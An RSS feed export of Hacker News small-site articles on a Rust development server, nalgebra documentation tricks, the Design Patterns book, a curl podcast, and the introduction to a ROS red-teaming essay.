</span><span>let mut</span><span> bytes </span><span>=</span><span> response</span><span>.</span><span>as_bytes</span><span>().</span><span>to_vec</span><span>();</span><span>
bytes</span><span>.</span><span>append</span><span>(&amp;</span><span>mut</span><span> file_contents</span><span>);</span><span>
stream</span><span>.</span><span>write_all</span><span>(&amp;</span><span>bytes</span><span>).</span><span>unwrap</span><span>();
</span></code></pre>
<p>It's all shockingly simple for how well it works. This handles most cases I've thrown at it and yet it's only a few lines of code!</p>
<h3 id="automatic-reload">Automatic Reload</h3>
<p>I use <code>devserver</code> to develop interactive game-like content, <a href="https://ianjk.com/rust-gamejam/">like the Rust game I made for Ludum Dare</a>, and quick iteration times are critical for similar creative work.</p>
<p>It's a great experience to make changes to a file and have it automatically update in the browser by the time you alt-tab to it.</p>
<p>There are two parts to this problem:</p>
<ul>
<li>Detect file and folder changes</li>
<li>Notify the browser to refresh</li>
</ul>
<p>Unfortunately watching for file and folder changes across platforms is finicky.</p>
<p>Fortunately the <a href="https://github.com/notify-rs/notify">Notify</a> crate already put in the hard work to figure it all out and it is a small enough dependency it doesn't hurt <code>devserver</code>'s minimalist build goals too much.</p>
<p>Notifying the browser that it needs to refresh requires an open connection to the browser, or some sort of continuous polling. Continous polling felt too heavy handed, so that was ruled out.</p>
<p>The approach I settled on was using a WebSocket to notify the browser that the a file had changed. Initially I planned on sending the new file to the browser so it could reload just that file, but I later decided to just settle for the "Good enough" solution of refreshing the browser.</p>
<p>I evaluated various WebSocket libraries to use. <a href="https://crates.io/crates/tungstenite">Tungstenite</a> seemed like a good solution, but sadly when I tried it out it nearly doubled <code>devserver</code>'s clean build times, so I decided to consider other alternatives.</p>
<p>I wasn't too fond of the idea, but perhaps if I could implement a spartan HTTP response I could also create a spartan WebSocket implementation? All <code>devserver</code> needed was just enough to signal the server somehow. So I started reading resources online about WebSockets and consulting the spec.</p>
<p>The WebSocket standard requires a seemingly arbitrarily formatted response to declare "Yes I really am a WebSocket" which is handled by the following code:</p>
<pre><code><span>// Perform a ceremony of getting the SHA1 hash of the sec_websocket_key joined with
// an arbitrary string and then take the base 64 encoding of that.
</span><span>let</span><span> sec_websocket_accept </span><span>= </span><span>format!</span><span>(
    "</span><span>{}{}</span><span>",</span><span>
    sec_websocket_key</span><span>, "</span><span>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</span><span>"
);
</span><span>let mut</span><span> hasher </span><span>= </span><span>Sha1</span><span>::</span><span>new</span><span>();</span><span>
hasher</span><span>.</span><span>input</span><span>(</span><span>sec_websocket_accept</span><span>.</span><span>as_bytes</span><span>());
</span><span>let</span><span> result </span><span>=</span><span> hasher</span><span>.</span><span>result</span><span>();
</span><span>let</span><span> bytes </span><span>= </span><span>base64</span><span>::</span><span>encode</span><span>(&amp;</span><span>result</span><span>);

</span><span>format!</span><span>("</span><span>HTTP/1.1 101 Switching Protocols</span><span>\r\n</span><span>Upgrade: websocket</span><span>\r\n</span><span>Connection: Upgrade</span><span>\r\n</span><span>Sec-WebSocket-Accept: {}</span><span>\r\n\r\n",</span><span>bytes</span><span>)

</span></code></pre>
<p>The above code introduces two direct dependencies: the <a href="https://crates.io/crates/sha-1"><code>sha-1</code></a> crate and the <a href="https://crates.io/crates/base64">`base64</a> crate, both required for the string formatting ceremony.</p>
<p>Once the connection is opened a blank message is sent along the WebSocket whenever a file changes. The web page refreshes whenever it receives any message from the server's WebSocket:</p>
<pre><code><span>Ok</span><span>(</span><span>event</span><span>) =&gt; {
    </span><span>let </span><span>(</span><span>_path</span><span>,</span><span> refresh</span><span>) = </span><span>match</span><span> event </span><span>{
        </span><span>/* Various events from Notify about file and folder changes */
    </span><span>};

    </span><span>if</span><span> refresh </span><span>{
        </span><span>// A blank message is sent triggering a refresh on any change.
        // If this message fails to send, then likely the socket has been closed.
        </span><span>if </span><span>send_websocket_message</span><span>(&amp;</span><span>stream</span><span>, "").</span><span>is_err</span><span>() {
            </span><span>break</span><span>;
        };
    }
}
</span></code></pre>
<p><code>devserver</code> injects the following snippet of Javascript into each <code>.html</code> file served to establish the WebSocket connection:</p>
<pre><code><span>// This code is inserted by devserver to enable reloading.
</span><span>const </span><span>socket </span><span>= new </span><span>WebSocket</span><span>("</span><span>ws://</span><span>" + </span><span>window</span><span>.</span><span>location</span><span>.</span><span>hostname </span><span>+ "</span><span>:8129</span><span>");
</span><span>socket</span><span>.</span><span>addEventListener</span><span>('</span><span>open</span><span>', </span><span>function </span><span>(</span><span>event</span><span>) { </span><span>console</span><span>.</span><span>log</span><span>("</span><span>Reloading enabled!</span><span>"); });
</span><span>socket</span><span>.</span><span>addEventListener</span><span>('</span><span>message</span><span>', </span><span>function </span><span>(</span><span>event</span><span>) { </span><span>location</span><span>.</span><span>reload</span><span>(); });
</span></code></pre>
<p>The code is appended in a <code>&lt;script&gt;</code> tag to the end of the document, and even though that's not the correct spot for a <code>&lt;script&gt;</code> tag the browsers handle it totally fine without error! Hooray for lenient browsers!</p>
<p>So with the combination of the <code>Notify</code> crate and a MacGyver-ed WebSocket implementation automatic page reloading works with only a small hit to <code>devserver</code>'s build times.</p>
<p>I could never remember (even though it's my own code!) if the flag was "--reload" or "--refresh" so <code>devserver</code> accepts both so I can never make that error again. Eventually I just made the flag on by default because I was using it every time I ran <code>devserver</code>.</p>
<h2 id="https">HTTPS</h2>
<p>Many development servers require configuring a certificate for HTTPS support, which can be a pain if all you want to do is locally develop for web APIs that require HTTPS (as WebXR does).</p>
<p><code>devserver</code> is very much <strong>not</strong> an acceptable production server. This lets <code>devserver</code> cut corners to make the experience of local development simpler.</p>
<p>Instead of using a valid certificate <code>devserver</code> just uses an invalid hardcoded security certificate. Web browsers warn that the certificate is invalid, but it is easy to ignore the warnings. You should <em>not</em> do this normally, but for local development it can be OK.</p>
<p>This is absolutely my least favorite part of <code>devserver</code>, and it's something I'd like to change in the future if possible.</p>
<p>It's not an elegant solution, but it allows <code>devserver</code> to run as a single command and support both https and http with zero configuration.</p>
<p>The <a href="https://crates.io/crates/native-tls"><code>native-tls</code></a> crate is used to handle opening the secure HTTPS socket. <code>native-tls</code> was a great choice for <code>devserver</code> because it handles the complex requirements of HTTPS but avoids lengthy build times by using the native platform TLS implementations.</p>
<p><code>devserver</code> handles both HTTPS and HTTP connections at the same time without a setting by checking which type an incoming connection is.</p>
<p>HTTP requests always begin with a verb like <code>GET</code>, but HTTPS requests always begin with a number. By peeking the first few bytes <code>devserver</code> can decide which path to take:</p>
<pre><code><span>let mut</span><span> buf </span><span>= [</span><span>0</span><span>; </span><span>2</span><span>];</span><span>
stream</span><span>.</span><span>peek</span><span>(&amp;</span><span>mut</span><span> buf</span><span>).</span><span>expect</span><span>("</span><span>peek failed</span><span>");

</span><span>let</span><span> is_https </span><span>=
    !((</span><span>buf</span><span>[</span><span>0</span><span>] as </span><span>char</span><span>).</span><span>is_alphabetic</span><span>() &amp;&amp; (</span><span>buf</span><span>[</span><span>1</span><span>] as </span><span>char</span><span>).</span><span>is_alphabetic</span><span>());

</span><span>if</span><span> ‚Ä¶</span></code></pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ianjk.com/devserver/">https://ianjk.com/devserver/</a></em></p>]]>
            </description>
            <link>https://ianjk.com/devserver/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515095</guid>
            <pubDate>Fri, 18 Sep 2020 10:40:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taming Nalgebra's Rustdoc]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515043">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://jack.wrenn.fyi/blog/rustdocing-nalgebra/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/rustdocing-nalgebra/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><a href="https://nalgebra.org/">Nalgebra</a> is a powerhouse of functionality, but its documentation can be overwhelming√¢‚Ç¨‚Äùthe <a href="https://nalgebra.org/rustdoc/nalgebra/base/struct.Matrix.html">documentation for <code>Matrix</code></a> lists over <em>600</em> methods. Your documentation endeavors might not be <em>quite</em> so overwhelming, but you still could benefit from these <strong>three tricks</strong> nalgebra uses to improve its docs.</p>
<h2 id="documenting-type-aliases">Documenting Type Aliases</h2>
<p><strong>TIP: Write <code>impl</code>s and documentation on type aliases.</strong></p>
<p>The <a href="https://nalgebra.org/rustdoc/nalgebra/base/struct.Matrix.html"><code>Matrix</code></a> <code>struct</code> type is at the heart of nalgebra's functionality. It is generically parametrized by dimension, so the same outer type is used to encode matrices of all sizes. A vector of dimension <code>R</code>, for instance, is merely a <code>Matrix</code> of <code>R</code> rows and <code>U1</code> columns.</p>
<p>From a programming ergonomics perspective, you might think it'd be convenient to codify this with a type alias; e.g.:</p>
<pre><code><span>type </span><span>Vector</span><span>&lt;</span><span>N, D, S</span><span>&gt; = </span><span>Matrix&lt;N, D, U1, S&gt;;
</span></code></pre>
<p>...and you'd be right; nalgebra defines just such a type alias!</p>
<p>But type aliases aren't <em>just</em> programming shorthand; they can be used to improve documentation, too: <strong>When an inherent <code>impl</code> is written in terms of a type alias, the documentation of that <code>impl</code> <em>also</em> appears of the documentation page of that type alias.</strong></p>
<p>Sure enough, if you visit nalgebra's <a href="https://docs.rs/nalgebra/0.22.0/nalgebra/base/type.Vector.html"><code>Vector</code> documentation page</a> type alias, you'll see <em>only</em> the methods specific to vectors:</p>

<p>Unfortunately, this same documentation is <a href="https://docs.rs/nalgebra/0.21.1/nalgebra/base/struct.Matrix.html#impl-1"><em>also</em> rendered on the page for <code>Matrix</code></a> and <em>without</em> the type aliases. This is why the documentation for the base <code>Matrix</code> type is so long. :-(</p>
<h2 id="coalescing-impls">Coalescing <code>impl</code>s</h2>
<p><strong>TIP: Reduce repetition by grouping methods with the same bounds into the a single bounded <code>impl</code>.</strong></p>
<p>One of nalgebra's cooler ergonomic shortcuts is <a href="https://en.wikipedia.org/wiki/Swizzling_(computer_graphics)"><em>vector swizzling</em></a>. A swizzle lets you build a new vector from some ordering and subset of the components of another vector. For instance, <code>vec.xyx()</code> constructs a new, three-dimensional vector comprised of the <code>x</code>, <code>y</code> and <code>x</code> components of <code>vec</code>.</p>
<p>Supporting this shortcut requires generating a <em>lot</em> of methods. A couple years ago, the documentation of these methods looked like this:</p>

<p><strong>This documentation has a very poor signal-to-noise ratio.</strong> The preamble</p>
<pre><code><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span></code></pre>
<p>is repeated for <em>every</em> swizzling method, and each individual swizzling method has its <em>own</em> <code>where</code> bound documenting its dimensionality requirements.</p>
<p>Nearly all of this repetition was eliminated with a <a href="https://github.com/dimforge/nalgebra/pull/485/files#diff-425bf3710eefe907a4f8369b92cd4966">minor change</a> to the macro generating these methods:</p>

<p><strong>What changed?</strong> The old macro generated an <code>impl</code> for each swizzling method:</p>
<pre><code><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xxx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector3&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xy</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U1, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>/* and so on */
</span></code></pre>
<p>The new macro groups the methods into one of just three <code>impl</code>s depending on their dimensionality requirements:</p>
<pre><code><span>// Swizzling methods for Vectors of dimension &gt; 0
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}

    </span><span>pub fn </span><span>xxx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector3&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>// Swizzling methods for Vectors of dimension &gt; 1
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U1, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xy</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}

</span><span>// Swizzling methods for Vectors of dimension &gt; 2
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U2, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xz</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}
</span></code></pre>
<p>...and rustdoc faithfully adheres to this organization when generating nalgebra's documentation!</p>
<p><strong>If you are generating <code>impl</code>s via a macro, check if your macro could be tweaked to group similar methods into the same <code>impl</code>!</strong></p>
<h2 id="documenting-impls">Documenting <code>impl</code>s</h2>
<p><strong>TIP: You can write documentations on individual <code>impl</code>s!</strong></p>
<p>Like Rust's slices, nalgebra's arrays allow for overloaded indexing; e.g.:</p>
<pre><code><span>let</span><span> matrix </span><span>= </span><span>Matrix3::new(</span><span>0</span><span>, </span><span>3</span><span>, </span><span>6</span><span>,
                          </span><span>1</span><span>, </span><span>4</span><span>, </span><span>7</span><span>,
                          </span><span>2</span><span>, </span><span>5</span><span>, </span><span>8</span><span>);

</span><span>// index a particular element
</span><span>assert_eq!(matrix.</span><span>index</span><span>((</span><span>0</span><span>, </span><span>0</span><span>)), </span><span>&amp;</span><span>0</span><span>);

</span><span>// select a range of rows and all columns
</span><span>assert!(matrix.</span><span>index</span><span>((</span><span>1</span><span>..</span><span>3</span><span>, </span><span>..</span><span>))
    .</span><span>eq</span><span>(</span><span>&amp;</span><span>Matrix2x3::new(</span><span>1</span><span>, </span><span>4</span><span>, </span><span>7</span><span>,
                        </span><span>2</span><span>, </span><span>5</span><span>, </span><span>8</span><span>)));
</span></code></pre>
<p>...and these overloaded index types are usable with a whole suite of associated methods: <code>index</code>, <code>index_mut</code>, <code>get</code>, <code>get_mut</code>, <code>get_unchecked</code> and <code>get_unchecked_mut</code>. The same indexing types can be used on each of these methods√¢‚Ç¨‚Äùthey only differ in their fallibility, mutability, and safety.</p>
<p>These six methods are grouped into the same <code>impl</code>. The documentation for the individual methods focuses just on their differences. Their similarities (namely, the different kinds of indexes which can be used) are documented <em>on this shared <code>impl</code></em>:</p>

<p><strong>If you have thematically similar methods, you can group them into their own <code>impl</code>, and write rustdoc on that <code>impl</code>!</strong></p>
<p>Concretely:</p>
<pre><code><span>/// # Indexing Operations
/// [documentation about indexing as a whole]
</span><span>impl</span><span>&lt;N: Scalar, R: Dim, C: Dim, S: Storage&lt;N, R, C&gt;&gt; Matrix&lt;N, R, C, S&gt; {
    </span><span>/// [documentation *just* for `get`]
    </span><span>#[</span><span>inline</span><span>]
    </span><span>pub fn </span><span>get</span><span>&lt;</span><span>'a</span><span>, I&gt;(</span><span>&amp;</span><span>'a </span><span>self</span><span>, </span><span>index</span><span>: I) -&gt; </span><span>Option</span><span>&lt;</span><span>I::</span><span>Output&gt;
    </span><span>where</span><span>
        I: MatrixIndex&lt;</span><span>'a</span><span>, N, R, C, S&gt;,
    { </span><span>... </span><span>}

    </span><span>/// [documentation *just* for `get_mut`]
    </span><span>#[</span><span>inline</span><span>]
    </span><span>pub fn </span><span>get_mut</span><span>&lt;</span><span>'a</span><span>, I&gt;(</span><span>&amp;</span><span>'a </span><span>self</span><span>, </span><span>index</span><span>: I) -&gt; </span><span>Option</span><span>&lt;</span><span>I::</span><span>Output&gt;
    </span><span>where</span><span>
        S: StorageMut&lt;N, R, C&gt;,
        I: MatrixIndexMut&lt;</span><span>'a</span><span>, N, R, C, S&gt;,
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}
</span></code></pre>
  </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/rustdocing-nalgebra/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515043</guid>
            <pubDate>Fri, 18 Sep 2020 10:33:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514953">thread link</a>) | @aseure
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I‚Äôll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I‚Äôm also starting to be disappointed by some of its negative aspects. While it doesn‚Äôt prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I‚Äôd like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we‚Äôll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as ‚Äúfoolish‚Äù does not end well.</p>
<p>While I disagree with the tone here, I‚Äôd like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it‚Äôs outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the ‚Äúflyweight‚Äù design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let‚Äôs get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn‚Äôt the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn‚Äôt. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let‚Äôs remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let‚Äôs not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father‚Äôs tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it‚Äôs directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don‚Äôt think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer ‚Äúcomposition over inheritance‚Äù. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you‚Äôre done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don‚Äôt see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: ‚ÄúDefine a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically‚Äù. Now, if we take a look at some modern technologies, doesn‚Äôt this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I‚Äôm not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I‚Äôm merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section ‚ÄúWhat to Expect from Design Patterns‚Äù, page 351:</p>
<blockquote>
<p>It‚Äôs possible to argue that this book hasn‚Äôt accomplished much. After all, it doesn‚Äôt present any algorithms or programming techniques that haven‚Äôt been used before. [‚Ä¶] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can‚Äôt offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don‚Äôt study design patterns in software, we won‚Äôt be able to improve them, and it‚Äôll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514953</guid>
            <pubDate>Fri, 18 Sep 2020 10:14:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Headlines: cURL special with Daniel Stenberg [audio]]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514932">thread link</a>) | @devrustr
<br/>
September 18, 2020 | https://blog.firosolutions.com/2020/09/security-headlines-curl-special/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/09/security-headlines-curl-special/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl‚Äôs many features is the ‚Äìlibcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl‚Äôs<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google‚Äôs fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

<h3 id="external-links">External links:</h3>

<p><a href="https://curl.haxx.se/">https://curl.haxx.se/</a><br>
<a href="https://curl.haxx.se/docs/security.html">https://curl.haxx.se/docs/security.html</a><br>
<a href="https://en.wikipedia.org/wiki/CURL">https://en.wikipedia.org/wiki/CURL</a><br>
<a href="https://twitter.com/bagder">https://twitter.com/bagder</a><br>
<a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a><br>
<a href="https://daniel.haxx.se/">https://daniel.haxx.se/</a><br>
<a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl">https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl</a><br>
<a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29">https://en.wikipedia.org/wiki/Gopher_%28protocol%29</a><br>
<a href="https://curl.haxx.se/mail/">https://curl.haxx.se/mail/</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/09/security-headlines-curl-special/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514932</guid>
            <pubDate>Fri, 18 Sep 2020 10:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Red teaming the Robot Operating System in industry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514906">thread link</a>) | @vmayoral
<br/>
September 18, 2020 | https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/ | <a href="https://web.archive.org/web/*/https://cybersecurityrobotics.net/red-teaming-the-ros-in-industry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	<div>
		<!--kg-card-begin: markdown--><p>ROS is rapidly becoming a standard in robotics, including its growing use in industry. The commonly held assumption that robots are to be deployed in closed and isolated networks does not hold any further and while developments in ROS 2 show promise, the slow adoption cycles in industry will push widespread ROS 2 industrial adoption years from now. ROS will prevail in the meantime so we wonder, <strong>can ROS be used securely for industrial use cases even though its origins didn't consider it?</strong></p>
<p>This essay summarizes the work my team and I conducted over the last period tackling this question. For more, refer to the following resources:</p>
<ul>
<li><a href="https://aliasrobotics.com/case-study-red-teaming.php"><code>Red teaming ROS-Industrial case study</code></a></li>
<li><a href="https://aliasrobotics.com/files/red_teaming_rosindustrial.pdf"><code>Red teaming ROS-Industrial extended report (white paper)</code></a> (<em>56 pages</em>)</li>
</ul>
<h3 id="isitsecuretouserosinindustry">Is it secure to use ROS in industry?</h3>
<p>The Robot Operating System (ROS) is the de facto framework for robot application development. According to the ROS community metrics that are sampled every year on July, more than 20 million total downloads of ROS packages happened in July 2019. A shocking number given the small size of the robotics community. At the time of writing, the original ROS article has been cited more than 7000 times, which shows its wide acceptance for research and academic purposes. ROS was born in this environment: its primary goal was to provide the software tools that users would need to undertake novel research and development.  First with the PR2 robot while being developed at Willow Garage, and then for the overall robotics community with the creation of the Open Source Robotics Foundation in 2012.</p>
